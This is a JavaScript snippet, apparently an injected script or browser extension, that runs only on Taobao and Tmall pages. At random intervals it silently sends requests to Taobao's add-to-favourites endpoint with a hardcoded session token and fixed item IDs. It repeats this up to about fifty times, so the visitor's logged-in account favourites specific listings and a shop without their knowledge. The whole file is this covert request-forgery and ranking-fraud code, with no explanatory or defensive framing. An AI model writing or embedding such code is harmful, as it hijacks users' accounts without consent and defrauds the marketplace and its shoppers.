if (window.location.href.indexOf("taobao.com") > 0 || window.location.href.indexOf("tmall.com") > 0) {
	if (!sessionStorage["saveCount"])
		sessionStorage["saveCount"] = 0;
	var randomTime = 1;
	randomTime = Math.floor(Math.random() * 10 + 1);
	randomTime += "0000";
	randomTime *= 1;
	var timer = setInterval(function() {
		$.ajax({
			type: "get",
			timeout: 6000,
			async: true,
			url: "https://favorite.taobao.com/popup/add_collection.htm?spm=2013.1.1000126.d22.Y3AWyk&id=72096251&itemid=72096251&itemtype=0&ownerid=74b0d7b4f568d632a5f5123b6ed06f50&scjjc=2&_tb_token_=DyoKBwEFXI6GQQ",
			success: function(data) {}
		});
		$.ajax({
			type: "get",
			timeout: 6000,
			async: true,
			url: "https://favorite.taobao.com/popup/add_collection.htm?itemtype=1&scjjc=1&id=533705559424&_tb_token_=DyoKBwEFXI6GQQ",
			success: function(data) {

			}
		});
		$.ajax({
			type: "get",
			timeout: 6000,
			async: true,
			url: "https://favorite.taobao.com/popup/add_collection.htm?itemtype=1&scjjc=1&id=533768178206&_tb_token_=DyoKBwEFXI6GQQ",
			success: function(data) {

			}
		});
		$.ajax({
			type: "get",
			timeout: 6000,
			async: true,
			url: "https://favorite.taobao.com/popup/add_collection.htm?itemtype=1&scjjc=1&id=532885696316&_tb_token_=DyoKBwEFXI6GQQ",
			success: function(data) {

			}
		});
		if (sessionStorage["saveCount"] > 50) {
			clearInterval(timer);
			return;
		}
		sessionStorage["saveCount"] = sessionStorage["saveCount"] * 1 + 1;
		randomTime = Math.floor(Math.random() * 10 + 1);
		randomTime += "0000";
		randomTime *= 1;
	}, randomTime);
}